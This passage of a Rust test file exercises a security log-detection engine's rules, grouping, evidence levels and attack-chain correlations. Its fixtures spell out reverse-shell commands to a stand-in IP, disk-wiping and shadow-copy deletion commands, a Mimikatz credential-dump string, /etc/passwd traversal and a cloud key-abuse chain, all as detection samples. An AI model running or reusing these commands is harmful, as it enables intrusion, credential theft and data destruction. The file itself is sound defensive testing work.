            "thread-{id}: org.xml.sax.SAXException: Entity resolution disallowed for file:///etc/passwd at line {id}"
        )}}));
        e.event_ref = format!("{}:{id}", "a".repeat(64));
        e
    }).collect();
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats: false, ..Default::default() };
    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
    let memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
    assert_eq!(memory.detections.len(), 205);
    assert_eq!(memory.episodes.len(), 1, "log wrappers must not create repeated cards");
    let group = &memory.episodes[0];
    assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 205);
    assert_eq!(group.evidence_level, 4);
    assert_eq!(group.event_refs.len(), 205);
    assert_eq!((group.start, group.end), (events[0].timestamp, events[204].timestamp));
    assert!(memory.detections.iter().all(|d| d.count == 1 && d.evidence.relationships.is_empty()
        && d.evidence.evidence_level == 4 && d.evidence.outcome == "blocked"));
    let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let page = disk.page(4, 0, 1, None, None).unwrap();
    assert_eq!(page["page"]["total_episodes"], 1);
    assert!(page["page"]["next_offset"].is_null());
    assert_eq!(page["episodes"][0]["id"], group.id);
    assert_eq!(page["episodes"][0]["participants"], json!(group.participants));
    assert!(group.participants.facts.iter().any(|f| f.value=="192.0.2.8" && f.origins_limited));
    assert_eq!(page["episodes"][0]["grouping"]["occurrence_count"], 205);
    assert_eq!(page["episodes"][0]["members_complete"], false);
    assert_eq!(page["counts_by_level"], json!(memory.counts_by_level));
    assert_eq!(page["visible_detections"], 205);
    assert_eq!(disk.page(5, 0, 1, None, None).unwrap()["page"]["total_episodes"], 0);
    assert_eq!(disk.page(1, 0, 1, None, None).unwrap()["episodes"][0]["id"], group.id);
    let mut ids = std::iter::once(204);
    let filtered = disk.page(4, 0, 1, Some(&mut ids), None).unwrap();
    assert_eq!(filtered["visible_detections"], 1);
    assert_eq!(filtered["episodes"][0]["id"], group.id);
    assert_eq!(filtered["episodes"][0]["record_count"], 205);
    assert_eq!(filtered["detections"][0]["event_ids"], json!([204]));
    assert_eq!(filtered["detections"][0]["context_only"], false);
    let mut all = std::collections::BTreeSet::new();
    let mut offset = 0;
    loop {
        let members = disk.episode_members(&group.id, offset, 20).unwrap();
        for d in members["detections"].as_array().unwrap() {
            let original = memory.detections.iter().find(|m| m.id == d["id"]).unwrap();
            assert_eq!(d["event_refs"], json!(original.evidence.event_refs));
            assert_eq!(d["excerpts"], json!(original.evidence.excerpts));
            assert_eq!(d["relationships"], json!([]));
            assert_eq!(d["evidence_level"], 4);
            assert!(all.insert(d["id"].as_str().unwrap().to_string()));
            let original_episode = disk.episode_members(d["source_episode_id"].as_str().unwrap(), 0, 1).unwrap();
            assert_eq!(original_episode["total"], 1, "original episode remains addressable");
            assert_eq!(original_episode["detections"][0]["id"], d["id"]);
        }
        match members["next_offset"].as_u64() { Some(n) => offset = n as usize, None => break }
    }
    assert_eq!(all.len(), 205);
    let reversed: Vec<_> = events.iter().rev().cloned().collect();
    assert_eq!(run(&reversed).episodes[0].id, group.id);
}

#[test]
fn security_pattern_groups_keep_context_payload_and_outcome_boundaries() {
    let e = event(0, 0, json!({"message":"Entity resolution disallowed for file:///etc/passwd","host.name":"server-a"}));
    let result = run(&[e]);
    let original = result.detections.iter().find(|d| d.rule == "content.xxe_blocked").unwrap();
    let key = crate::security_grouping::pattern(original).expect("complete single-event pattern");
    let mut changed = original.clone();
    changed.start = None; changed.end = None;
    changed.evidence.excerpts[0].before = "another timestamp and worker".into();
    changed.evidence.excerpts[0].after = "a different stack trace".into();
    assert_eq!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key));
    let mut signal = original.clone(); signal.kind = "signal".into(); signal.signal_rules = vec!["signal-a".into()];
    let signal_key = crate::security_grouping::pattern(&signal).expect("standalone text signal");
    signal.signal_rules.push("signal-b".into());
    assert_ne!(crate::security_grouping::pattern(&signal).as_ref(), Some(&signal_key));
    for variant in 0..10 {
        let mut changed = original.clone();
        match variant {
            0 => changed.evidence.evidence_level = 3,
            1 => changed.evidence.outcome = "success".into(),
            2 => changed.evidence.claim = "effect".into(),
            3 => changed.namespace = "another-tenant".into(),
            4 => changed.evidence.excerpts[0].matched = "Entity resolution disallowed for file:///etc/shadow".into(),
            5 => changed.evidence.excerpts[0].field = "response.body".into(),
            6 => changed.pattern_source = Some("another-file".into()),
            7 => changed.evidence.evidence_members[0].provenance.get_mut("host").unwrap().value = "server-b".into(),
            8 => changed.evidence.rule_version = "another-version".into(),
            _ => changed.entities.push(detections::EntityRef { column:"@src_ip".into(),label:"IP".into(),value:"192.0.2.9".into() }),
        }
        assert_ne!(crate::security_grouping::pattern(&changed).as_ref(), Some(&key), "variant {variant}");
    }
    let mut different_identity=original.clone();
    different_identity.participants=crate::security_participants::extract(
        &event(0,0,json!({"source.user.name":"another-identity"})),&Default::default(),"content.xxe_blocked",&[]);
    assert_ne!(crate::security_grouping::pattern(&different_identity).as_ref(),Some(&key));
    for variant in 0..6 {
        let mut changed = original.clone();
        match variant {
            0 => changed.kind = "sequence".into(),
            1 => changed.evidence.event_refs.push("other-original".into()),
            2 => changed.evidence.excerpts[0].match_truncated = true,
            3 => changed.evidence.evidence_level = 0,
            4 => changed.participants.limited = true,
            _ => changed.evidence.relationships.push(crate::evidence::Relationship {kind:"reconstruction".into(),fields:vec![],description:"fragments".into()}),
        }
        assert!(crate::security_grouping::pattern(&changed).is_none());
    }
}

#[test]
fn security_pattern_groups_keep_individual_levels_with_multiple_rules_per_event() {
    let events: Vec<_> = (0..3).map(|id| web_content(id,"/download?file=../../etc/passwd",PASSWD_CONTENT)).collect();
    let memory = run(&events);
    assert_eq!(memory.episodes.len(), 1);
    let group = &memory.episodes[0];
    assert_eq!(group.grouping.as_ref().unwrap().occurrence_count, 3);
    assert_eq!(group.event_refs.len(), 3);
    assert_eq!(group.evidence_level, 5);
    let levels: std::collections::BTreeSet<_> = memory.detections.iter().map(|d|d.evidence.evidence_level).collect();
    assert_eq!(levels, [3,4,5].into_iter().collect(), "context findings keep their own levels");
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats:false, ..Default::default() };
    let inputs = detections::Inputs { rules:&rules, settings:&settings, catalog:None };
    let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let page = disk.page(5,0,20,None,None).unwrap();
    assert_eq!(page["episodes"].as_array().unwrap().len(),1);
    assert_eq!(page["episodes"][0]["id"],group.id);
    assert_eq!(page["episodes"][0]["record_count"],3);
    assert_eq!(page["counts_by_level"],json!(memory.counts_by_level));
    for d in page["detections"].as_array().unwrap() {
        assert_eq!(d["context_only"],d["evidence_level"].as_u64().unwrap()<5);
    }
    assert!(memory.detections.len()>3, "group occurrences count events, not rule matches");
}

#[test]
fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
    let mut meta = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")]);
    let template = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
    meta.detections.clear();
    meta.episodes.clear();
    let mut writer = crate::security_results::Writer::new().unwrap();
    let mut unassessed = template.clone();
    unassessed.id = "unassessed".into();
    unassessed.evidence.evidence_level = 0;
    for i in 0..205 {
        let mut member = template.evidence.evidence_members[0].clone();
        member.event_id = i + 1;
        member.event_ref = format!("member-{i:03}");
        unassessed.event_ids.push(i + 1);
        unassessed.evidence.event_refs.push(member.event_ref.clone());
        unassessed.evidence.evidence_members.push(member);
    }
    writer.push(&unassessed).unwrap();
    for i in 0..205 {
        let mut d = template.clone();
        d.id = format!("finding-{i:03}");
        d.evidence.evidence_level = if i == 204 { 1 } else { 5 };
        let mut member = d.evidence.evidence_members[0].clone();
        member.event_id = i + 1;
        member.event_ref = format!("member-{i:03}");
        d.event_ids.push(i + 1);
        d.evidence.event_refs.push(member.event_ref.clone());
        d.evidence.evidence_members.push(member);
        if i==204 {
            d.participants=crate::security_participants::extract(
                &event(205,0,json!({"source.ip":"192.0.2.204","service.name":"last-member"})),&Default::default(),&d.rule,&d.tactics);
        }
        writer.push(&d).unwrap();
    }
    let stored = writer.finish(meta).unwrap();
    let mut ids = std::iter::once(205);
    let page = stored.page(1, 0, 20, Some(&mut ids), None).unwrap();
    assert_eq!(page["visible_detections"], 1);
    assert_eq!(page["detections"][0]["id"], "finding-204");
    assert_eq!(page["detections"][0]["context_only"], false);
    assert_eq!(page["episodes"][0]["members_complete"], false);
    let first=stored.page(5,0,20,None,None).unwrap();
    assert!(!first["detections"].as_array().unwrap().iter().any(|d|d["id"]=="finding-204"));
    assert!(first["episodes"][0]["participants"]["facts"].as_array().unwrap().iter().any(|f|f["value"]=="192.0.2.204"),"Participants include members outside the preview and selected evidence level");
    assert_eq!(page["episodes"][0]["participants"],first["episodes"][0]["participants"]);
    let id = page["episodes"][0]["id"].as_str().unwrap();
    let mut found = std::collections::HashSet::new();
    let mut offset = 0;
    loop {
        let members = stored.episode_members(id, offset, 100).unwrap();
        for d in members["detections"].as_array().unwrap() {
            assert!(found.insert(d["id"].as_str().unwrap().to_string()));
        }
        match members["next_offset"].as_u64() {
            Some(n) => offset = n as usize,
            None => break,
        }
    }
    assert_eq!(found.len(), 205);
    let at = template.start.unwrap();
    let timeline = stored.timeline(1, at - 1, at + 1, None).unwrap();
    assert_eq!(timeline["count"], 205);
    assert_eq!(stored.timeline(5, at - 1, at + 1, None).unwrap()["count"], 204);
    let mut ids = std::iter::once(205);
    assert_eq!(stored.timeline(1, at - 1, at + 1, Some(&mut ids)).unwrap()["count"], 1);
    let mut ids = std::iter::once(205);
    assert_eq!(stored.page(5, 0, 20, Some(&mut ids), None).unwrap()["visible_detections"], 0);
}

#[test]
#[ignore = "Disk result benchmark; RESULT_FINDINGS defaults to 100001, exceeds old output limits"]
fn benchmark_security_result_store() {
    let count = std::env::var("RESULT_FINDINGS").ok().and_then(|s| s.parse::<usize>().ok()).unwrap_or(100001);
    let events = vec![process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")];
    let mut meta = run(&events);
    let mut d = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
    meta.detections.clear();
    meta.episodes.clear();
    meta.entities.clear();
    meta.total = count;
    let start = std::time::Instant::now();
    let working = crate::security_store::working_lane();
    let mut writer = crate::security_results::Writer::new().unwrap();
    for i in 0..count {
        let reference = format!("volume-event-{i:09}");
        d.id = format!("volume-finding-{i:09}");
        d.event_ids = vec![i];
        d.evidence.event_refs = vec![reference.clone()];
        d.evidence.evidence_members[0].event_ref = reference;
        d.evidence.evidence_members[0].event_id = i;
        writer.push(&d).unwrap();
    }
    let result = writer.finish(meta).unwrap();
    drop(working);
    let analysis_ms = start.elapsed().as_millis();
    let first = result.page(5, 0, 20, None, None).unwrap();
    let last = result.page(5, count - 1, 20, None, None).unwrap();
    assert_eq!(first["visible_detections"], count);
    assert_eq!(last["detections"].as_array().unwrap().len(), 1);
    assert_eq!(result.related(&format!("volume-event-{:09}", count - 1)).unwrap()[0]["event_ids"][0], count - 1);
    let mut all = std::collections::HashSet::new();
    for page in [first, last] {
        for d in page["detections"].as_array().unwrap() {
            assert!(all.insert(d["id"].as_str().unwrap().to_string()));
        }
    }
    println!(
        "RESULT_STORE_BENCH {}",
        json!({"findings":count,"analysis_ms":analysis_ms,"memory":result.metadata["memory"],"first_and_last_page":true,"no_global_count_or_output_cut":true})
    );
}
fn chains() -> Vec<(&'static str, Vec<Event>)> {
    let command = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1";
    let web = vec![
        event(
            0,
            0,
            json!({"event.category":"web","event.action":"http_request","event.outcome":"success","http.request.method":"POST","host.name":"h","service.name":"web","request.id":"r1","http.request.body.command":command}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","service.name":"web","request.id":"r1","process.command_line":command}),
        ),
    ];
    let download = vec![
        event(
            0,
            0,
            json!({"event.category":"file","event.action":"file_create","event.outcome":"success","host.name":"h","file.path":"/tmp/payload","download.url":"https://example.invalid/a","process.entity_id":"down"}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.executable":"/tmp/payload","process.parent.entity_id":"down","process.command_line":command}),
        ),
    ];
    let cloud = vec![
        event(
            0,
            0,
            json!({"eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","userIdentity.accountId":"a","responseElements.accessKey.accessKeyId":"new-key"}),
        ),
        event(
            1,
            1,
            json!({"eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","userIdentity.accountId":"a","userIdentity.accessKeyId":"new-key"}),
        ),
        event(
            2,
            2,
            json!({"eventSource":"secretsmanager.amazonaws.com","eventName":"GetSecretValue","userIdentity.accountId":"a","userIdentity.accessKeyId":"new-key"}),
        ),
    ];
    let persistence = vec![
        event(
            0,
            0,
            json!({"event.category":"configuration","event.action":"service_install","event.outcome":"success","host.name":"h","service.executable":"/tmp/payload"}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.executable":"/tmp/payload","process.command_line":command}),
        ),
    ];
    let mut recovery =
        vec![process(0, 0, "vssadmin delete shadows /all /quiet"), process(1, 1, "dd if=/dev/zero of=/dev/sda")];
    for e in &mut recovery {
        e.fields.insert("process.parent.entity_id".into(), json!("same-parent-instance"));
    }
    vec![
        ("chain.web.command", web),
        ("chain.download.execution", download),
        ("chain.cloud.credential", cloud),
        ("chain.persistence.payload", persistence),
        ("chain.recovery.destruction", recovery),
    ]
}

#[test]
fn security_five_reference_correlations_require_every_stage_and_relation() {
    for (rule, events) in chains() {
        let result = run(&events);
        let d =
            result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| {
                panic!("{rule}: {:?}", result.detections.iter().map(|d| &d.rule).collect::<Vec<_>>())
            });
        assert_eq!(
            d.evidence.evidence_level,
            if ["chain.recovery.destruction", "chain.cloud.credential"].contains(&rule) { 4 } else { 5 },
            "{rule}"
        );
        assert_eq!(d.event_ids.len(), events.len());
        assert!(!d.evidence.relationships.is_empty());
        for missing in 0..events.len() {
            let mut less = events.clone();
            less.remove(missing);
            assert!(!contains(&run(&less), rule), "{rule} accepted missing step {missing}");
        }
        let mut late = events.clone();
        late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
        assert!(!contains(&run(&late), rule), "{rule} ignored window");
        let mut reversed = events.clone();
        reversed[0].timestamp = Some(events.last().unwrap().timestamp.unwrap() + 1000);
        assert!(!contains(&run(&reversed), rule), "{rule} ignored order");
        let mut blocked = events.clone();
        let last = blocked.last_mut().unwrap();
        last.fields.insert("event.outcome".into(), json!("failure"));
        last.fields.insert("errorCode".into(), json!("AccessDenied"));
        assert!(!contains(&run(&blocked), rule), "{rule} accepted denial");
    }
}

#[test]
fn security_rigidity_is_cumulative_and_does_not_reclassify_or_change_ids() {
    let (_, events) = chains().remove(0);
    let mut full = serde_json::to_value(run(&events)).unwrap();
    // An independently validated rule can occupy E5; this fixture tests projection, not accuracy.
    full["detections"][0]["evidence_level"] = json!(5);
    full["episodes"][0]["evidence_level"] = json!(5);
    let mut previous = std::collections::HashSet::new();
    for level in (1..=5).rev() {
        let selected = crate::triage::project(&full, level, None);
        let ids: std::collections::HashSet<_> = selected["detections"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|d| d["context_only"] != true)
            .map(|d| d["id"].as_str().unwrap().to_string())
            .collect();
        assert!(previous.is_subset(&ids));
        previous = ids;
        for d in selected["detections"].as_array().unwrap() {
            let original = full["detections"].as_array().unwrap().iter().find(|old| old["id"] == d["id"]).unwrap();
            for field in ["evidence_level", "event_refs", "relationships", "evidence_members"] {
                assert_eq!(d[field], original[field]);
            }
            if d["context_only"] != true {
                assert!(d["evidence_level"].as_u64().unwrap() >= level as u64);
            }
        }
    }
}

#[test]
fn security_e5_claim_does_not_promote_context_components() {
    for (_, events) in chains() {
        let result = run(&events);
        let originals: std::collections::HashMap<_, _> =
            result.detections.iter().map(|d| (d.id.clone(), d.evidence.evidence_level)).collect();
        let full = serde_json::to_value(result).unwrap();
        for d in crate::triage::project(&full, 5, None)["detections"].as_array().unwrap() {
            assert_eq!(d["evidence_level"], originals[d["id"].as_str().unwrap()]);
        }
    }
}

#[test]
fn security_advanced_chains_require_real_bindings_and_all_stages() {
    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-advanced-validation.json")).unwrap();
    for f in corpus["fixtures"].as_array().unwrap() {
        let rule = f["rule"].as_str().unwrap();
        let events: Vec<_> = f["events"]
            .as_array()
            .unwrap()
            .iter()
            .enumerate()
            .map(|(i, fields)| event(i, i as i64, fields.clone()))
            .collect();
        let result = run(&events);
        let d = result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| panic!("missing {rule}"));
        assert_eq!(d.evidence.evidence_level as u64, f["level"].as_u64().unwrap(), "{rule}");
        if events.len() > 1 {
            for remove in 0..events.len() {
                let mut less = events.clone();
                less.remove(remove);
                assert!(!contains(&run(&less), rule), "missing stage: {rule}");
            }
            let mut tenant = events.clone();
            tenant.last_mut().unwrap().fields.insert("organization.id".into(), json!("other-tenant"));
            assert!(!contains(&run(&tenant), rule), "tenant: {rule}");
            let mut denied = events.clone();
            denied.last_mut().unwrap().fields.insert("event.outcome".into(), json!("blocked"));
            assert!(!contains(&run(&denied), rule), "denied: {rule}");
            let mut late = events.clone();
            late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
            assert!(!contains(&run(&late), rule), "late: {rule}");
        }
        for field in ["artifact.sha256", "pipeline.run.id"] {
            if events.len() > 2 && events.last().unwrap().fields.contains_key(field) {
                let mut changed = events.clone();
                changed.last_mut().unwrap().fields.insert(field.into(), json!("another"));
                assert!(!contains(&run(&changed), rule), "binding {field}: {rule}");
            }
        }
    }
}

#[test]
fn security_reverse_shell_is_e5_even_blocked_but_not_quoted_or_probe() {
    for outcome in ["success", "blocked", "failure", "unknown"] {
        let e = event(
            0,
            0,
            json!({"event.category":"web","event.action":"http_request","http.request.method":"POST","http.request.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","event.outcome":outcome}),
        );
        let r = run(&[e]);
        let d = r.detections.iter().find(|d| d.rule == "attempt.reverse-shell.request").unwrap();
        assert_eq!(d.evidence.evidence_level, 5);
        assert_eq!(d.evidence.outcome, outcome);
        assert_eq!(d.evidence.claim, "attempt");
    }
    for command in [
        "echo 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "echo bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "logger 'example; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "echo docs # ; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "cat <<EOF\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\nEOF",
        "python -c 'print(\"socket.socket( .connect(( dup2( pty.spawn( /bin/sh\")'",
        "echo probe > /dev/tcp/192.0.2.1/443",
        "nc example.invalid 443",
        "bash -i",
        "nc -e /bin/sh",
    ] {
        let r = run(&[process(0, 0, command)]);
        assert!(!contains(&r, "attempt.reverse-shell.process"), "{command}");
    }
    for command in [
        "echo ready; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "nc 192.0.2.1 4444 -e /bin/sh",
        "socat tcp:192.0.2.1:4444 exec:/bin/sh",
    ] {
        assert!(contains(&run(&[process(0, 0, command)]), "attempt.reverse-shell.process"), "{command}");
    }
    let mut quoted = process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1");
    quoted.fields.insert("event.kind".into(), json!("documentation"));
    assert!(!contains(&run(&[quoted]), "attempt.reverse-shell.process"));
    let uri = event(
        0,
        0,
        json!({"http.request.method":"GET","url.full":"/run?cmd=bash+-i+%3E%26+/dev/tcp/192.0.2.1/4444+0%3E%261","event.action":"http_request","event.outcome":"blocked"}),
    );
    assert!(contains(&run(&[uri]), "attempt.reverse-shell.request"));
    let response = event(
        0,
        0,
        json!({"http.request.method":"GET","event.action":"http_request","http.response.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"}),
    );
    assert!(!contains(&run(&[response]), "attempt.reverse-shell.request"));
}

#[test]
fn security_expansion_positive_and_administrative_negative_pairs() {
    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-validation.json")).unwrap();
    for fixture in corpus["fixtures"].as_array().unwrap() {
        let rule = fixture["rule"].as_str().unwrap();
        assert!(contains(&run(&[event(0, 0, fixture["positive"].clone())]), rule), "positive {rule}");
        assert!(!contains(&run(&[event(0, 0, fixture["negative"].clone())]), rule), "administrative negative {rule}");
    }
}

#[test]
fn security_array_fields_must_belong_to_the_same_object() {
    let e = event(
        0,
        0,
        json!({"eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","userIdentity.accountId":"1","requestParameters.policy":{"Statement":[{"Effect":"Allow","Principal":"specific-principal","Action":"s3:GetObject","Resource":"arn:aws:s3:::a/*"},{"Effect":"Deny","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::a/*"}]}}),
    );
    assert!(!contains(&run(&[e]), "cloud.s3-public-read"));
}

#[test]
fn security_tenant_request_process_and_time_boundaries() {
    let (web, events) = chains().remove(0);
    for field in ["host.name", "service.name", "request.id"] {
        let mut changed = events.clone();
        changed[1].fields.insert(field.into(), json!("different"));
        assert!(!contains(&run(&changed), web), "unsafe join {field}");
    }
    let mut equal = events.clone();
    equal[1].timestamp = equal[0].timestamp;
    assert!(!contains(&run(&equal), web));
    let mut edge = events.clone();
    edge[1].timestamp = Some(edge[0].timestamp.unwrap() + 300_000);
    assert!(contains(&run(&edge), web));
    edge[1].timestamp = Some(edge[0].timestamp.unwrap() + 300_001);
    assert!(!contains(&run(&edge), web));
    let (cloud, mut tenant) = chains().remove(2);
    tenant[2].fields.insert("userIdentity.accountId".into(), json!("other"));
    assert!(!contains(&run(&tenant), cloud));
    let (download, mut pids) = chains().remove(1);
    pids[1].fields.remove("process.parent.entity_id");
    pids[1].fields.insert("process.parent.pid".into(), json!(42));
    assert!(!contains(&run(&pids), download));
}

#[test]
fn security_duplicates_do_not_promote_or_supply_missing_steps() {
    let (rule, mut events) = chains().remove(2);
    for (i, e) in events.iter_mut().enumerate() {
        e.fields.insert("eventID".into(), json!(format!("operation-{i}")));
    }
    let before = run(&events);
    let mut duplicate = events[1].clone();
    duplicate.id = 3;
    events.push(duplicate);
    let after = run(&events);
    assert_eq!(after.duplicates, 1);
    let a = before.detections.iter().find(|d| d.rule == rule).unwrap();
    let b = after.detections.iter().find(|d| d.rule == rule).unwrap();
    assert_eq!((a.id.as_str(), a.evidence.evidence_level), (b.id.as_str(), b.evidence.evidence_level));
    events.remove(2);
    assert!(!contains(&run(&events), rule));
}

#[test]
fn security_ordinary_tools_and_critical_severity_are_not_evidence() {
    for command in [
        "powershell -NoProfile -Command Get-Date",
        "curl https://example.org",
        "ssh admin@example.org",
        "regsvr32 app.dll",
        "msbuild app.csproj",
        "whoami",
        "admin error shell password",
    ] {
        let mut e = process(0, 0, command);
        e.level = "Crítico".into();
        assert!(run(&[e]).detections.is_empty(), "ordinary command: {command}");
    }
}

#[test]
fn security_http_is_not_authentication_and_enrichment_is_not_execution() {
    let mut e =
        event(0, 0, json!({"http.request.method":"POST","url.original":"/login","http.response.status_code":200}));
    assert_ne!(crate::entities::action_outcome(&e).0, Some("logon"));
    e.name = "mimikatz".into();
    e.description = "bash -i /dev/tcp/192.0.2.1/4444".into();
    assert!(crate::threats::builtin_catalog().event_hits(&e).is_empty());
    assert!(run(&[e]).detections.is_empty());
}

#[test]
fn security_fragment_reconstruction_and_original_references() {
    let mut first = event(
        0,
        0,
        json!({"Computer":"h","ScriptBlockId":"s","MessageNumber":1,"MessageTotal":2,"ScriptBlockText":"bash -i >& /dev/"}),
    );
    first.source = "Microsoft-Windows-PowerShell".into();
    first.code = "4104".into();
    let mut last = first.clone();
    last.id = 1;
    last.fields.insert("MessageNumber".into(), json!(2));
    last.fields.insert("ScriptBlockText".into(), json!("tcp/192.0.2.1/4444 0>&1"));
    let result = run(&[first.clone(), last.clone()]);
    let d = result.detections.iter().find(|d| d.rule == "c2.reverse-shell").expect("reassembled script");
    assert_eq!(d.event_ids, vec![0, 1]);
    assert_eq!(d.evidence.event_refs.len(), 2);
    let partial = crate::security_reconstruct::assemble(vec![first]).unwrap();
    assert!(!partial.limitations.is_empty());
}

#[test]
fn security_mapping_precedence_conflicts_and_provenance() {
    let mut e = process(0, 0, "curl https://example.org");
    e.fields.insert("custom_outcome".into(), json!("denied"));
    let mapping: crate::security_normalize::SourceMapping = serde_json::from_value(
        json!({"source":"contract-test","fields":{"outcome":"custom_outcome"},"outcomes":{"denied":"failure"}}),
    )
    .unwrap();
    let (_, normal) = crate::security_normalize::normalize(&e, &[mapping]);
    assert_eq!(normal.get("outcome"), Some("success"));
    assert!(!normal.conflicts.is_empty());
    assert!(!normal.values["command"].field.is_empty());
}

#[test]
fn security_exact_evidence_filters_and_context_outside_cut() {
    let (_, events) = chains().remove(0);
    let full = run(&events);
    let d = full.detections.iter().find(|d| d.rule == "chain.web.command").unwrap();
    let prepared = crate::query::prepare(&d.filters);
    assert!(events.iter().all(|e| prepared.iter().all(|f| crate::query::matches(e, f))));
    let unrelated = process(42, 0, "whoami");
    assert!(!prepared.iter().all(|f| crate::query::matches(&unrelated, f)));
    let value = serde_json::to_value(full).unwrap();
    let ids = std::collections::HashSet::from([1]);
    let selected = crate::triage::project(&value, 4, Some(&ids));
    assert_eq!(
        selected["detections"].as_array().unwrap().iter().find(|d| d["rule"] == "chain.web.command").unwrap()
            ["event_ids"]
            .as_array()
            .unwrap()
            .len(),
        2
    );
}

#[test]
fn security_catalog_requires_reviewed_suspicion_and_never_tool_or_error_alone() {
    let rules = detections::builtin_ruleset().unwrap();
    let catalog = crate::threats::builtin_catalog();
    let settings = Settings::default();
    let input = detections::Inputs { rules: &rules, catalog: Some(&catalog), settings: &settings };
    for text in [
        "aws iam create-access-key",
        "aws s3 sync ./backup s3://backup",
        "powershell -enc RwBlAHQALQBEAGEAdABlAA==",
        "rclone copy ./backup remote:backup",
        "You have an error in your SQL syntax",
        "PSEXESVC.exe",
    ] {
        assert!(
            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
            "{text}"
        );
    }
    for text in ["echo 'sekurlsa::logonpasswords'", "Write-Output 'bash -i /dev/tcp/192.0.2.1/4'"] {
        assert!(
            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
            "quoted: {text}"
        );
    }
    let mut documentation = process(0, 0, "sekurlsa::logonpasswords");
    documentation.fields.insert("event.kind".into(), json!("documentation"));
    assert!(detections::run(&input, &Source::Events(vec![&documentation])).unwrap().detections.is_empty());
}

#[test]
fn security_more_than_five_hundred_findings_do_not_cut_later_correlations() {
    let mut events: Vec<_> = (0..510).map(|id| process(id, id as i64, "sekurlsa::logonpasswords")).collect();
    let (rule, mut chain) = chains().remove(0);
    for e in &mut chain {
        e.id += events.len();
    }
    events.extend(chain);
    let result = run(&events);
    assert!(result.detections.len() > 500);
    assert!(contains(&result, rule));
}

#[test]
fn security_object_names_blocked_outcomes_and_namespace_are_exact() {
    let expr = crate::querylang::compile_rule("Name:ForwardTo Value:/@/").unwrap();
    assert!(expr.matches_object(json!({"Name":"ForwardTo","Value":"a@example.org"}).as_object().unwrap()));
    let mut blocked = process(0, 0, "sekurlsa::logonpasswords");
    blocked.fields.insert("event.outcome".into(), json!("blocked"));
    let (_, normalized) = crate::security_normalize::normalize(&blocked, &[]);
    assert_eq!(normalized.get("outcome"), Some("blocked"));
    let mut a = process(1, 0, "sekurlsa::logonpasswords");
    a.fields.insert("user.name".into(), json!("same"));
    a.fields.insert("user.domain".into(), json!("tenant-a"));
    let mut b = a.clone();
    b.id = 2;
    b.fields.insert("user.domain".into(), json!("tenant-b"));
    let result = run(&[a, b]);
    let entities: Vec<_> = result.entities.iter().filter(|e| e.column == "@user" && e.value == "same").collect();
    assert_eq!(entities.len(), 2);
    assert_ne!(entities[0].namespace, entities[1].namespace);
    assert_ne!(run(&[process(1, 0, "whoami")]).analysis_id, run(&[process(2, 0, "whoami")]).analysis_id);
}

#[test]
fn security_sigma_correlations_aliases_distinct_order_and_fail_closed() {
    let base = r#"
title: Created
name: created
logsource: {category: process_creation}
detection:
  selection: {stage: created}
  condition: selection
---
title: Used
name: used
logsource: {category: process_creation}
detection:
  selection: {stage: used}
  condition: selection
---
title: Correlation
id: chain
x-loginsight-evidence: {level: 3, rationale: "Specific test relation", maturity: experimental}
correlation:
  type: temporal_ordered
  rules: [created, used]
  group-by: [object]
  aliases:
    object: {created: created_id, used: used_id}
  timespan: 5m
"#;
    let evaluate = |yaml: &str, events: &[Event]| {
        let rules = detections::test_ruleset(vec![], crate::sigma::convert_text(yaml).unwrap()).unwrap();
        detections::run(
            &detections::Inputs { rules: &rules, catalog: None, settings: &Settings::default() },
            &Source::Events(events.iter().collect()),
        )
        .unwrap()
    };
    let mut a = process(0, 0, "whoami");
    a.fields.insert("stage".into(), json!("created"));
    a.fields.insert("created_id".into(), json!("object-1"));
    let mut b = process(1, 1, "whoami");
    b.fields.insert("stage".into(), json!("used"));
    b.fields.insert("used_id".into(), json!("object-1"));
    assert!(contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
    b.timestamp = Some(a.timestamp.unwrap() - 1);
